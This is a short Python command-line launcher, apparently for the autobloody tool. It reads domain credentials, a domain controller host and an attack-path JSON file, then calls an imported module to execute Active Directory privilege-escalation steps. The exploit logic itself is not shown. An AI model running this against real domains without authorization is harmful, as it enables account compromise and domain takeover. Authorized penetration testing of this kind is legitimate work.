#!/usr/bin/env python3
import argparse, json, sys
from autobloody import automation

def main():
    parser = argparse.ArgumentParser(description='Attack Path Executor', formatter_class=argparse.RawTextHelpFormatter)

    # Exploitation parameters
    parser.add_argument('-d', '--domain', help='Domain used for NTLM authentication')
    parser.add_argument('-u', '--username', help='Username used for NTLM authentication')
    parser.add_argument('-p', '--password', help='Cleartext password or LMHASH:NTHASH for NTLM authentication')
    parser.add_argument('-k', '--kerberos', action='store_true', default=False)
    parser.add_argument('-c', '--certificate', help='Certificate authentication, e.g: "path/to/key:path/to/cert"')
    parser.add_argument('-s', '--secure', help='Try to use LDAP over TLS aka LDAPS (default is LDAP)', action='store_true', default=False)
    parser.add_argument('--host', help='Hostname or IP of the DC (ex: my.dc.local or 172.16.1.3)', required=True)
    parser.add_argument('--path', help='Filename of the attack path generated with pathgen.py (default is "path.json")', default="path.json")

    if len(sys.argv)==1:
            parser.print_help(sys.stderr)
            sys.exit(1)
            
    args = parser.parse_args()
    automate = automation.Automation(args)
    with open(args.path, 'r') as f:
        automate.exploit(json.load(f))
        print("[+] Done, attack path executed")


if __name__ == '__main__':
    main()
